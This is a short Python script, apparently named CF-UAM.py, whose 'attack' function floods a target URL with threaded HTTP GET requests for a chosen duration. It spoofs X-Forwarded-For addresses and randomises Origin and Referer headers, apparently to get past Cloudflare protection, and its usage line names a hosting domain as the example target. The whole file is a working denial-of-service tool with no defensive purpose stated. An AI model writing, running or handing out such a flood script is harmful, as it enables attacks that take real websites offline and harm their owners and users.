import requests
import random
import string
import sys
import time
import threading
from urllib.parse import urlparse

def random_byte():
    return random.randint(0, 255)

def generate_random_string(length=12, charset='mareskizocbteam/2/2/2/2abcdefghijklmnopqstuvwxyz0123456789/ccl/ss'):
    return ''.join(random.choice(charset) for _ in range(length))

def attack(url, duration):
    def send_request():
        try:
            response = requests.get(url)
            cookie = response.request.headers.get('Cookie', '')
            user_agent = response.request.headers.get('User-Agent', '')

            rand = generate_random_string()
            ip = f"{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}"
            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': cookie,
                'Origin': f"http://{rand}.com",
                'Referer': f"http://google.com/{rand}",
                'X-Forwarded-For': ip
            }

            requests.get(url, headers=headers)
        except Exception as e:
            print("Error occurred:", e)

    end_time = time.time() + duration
    while time.time() < end_time:
        threading.Thread(target=send_request).start()
        time.sleep(0.1)

if __name__ == "__main__":
    if len(sys.argv) <= 2:
        print("Usage: python CF-UAM.py https://www.kgb-hosting.com 60")
        sys.exit(-1)

    target_url = sys.argv[1]
    attack_duration = int(sys.argv[2])

    attack(target_url, attack_duration)

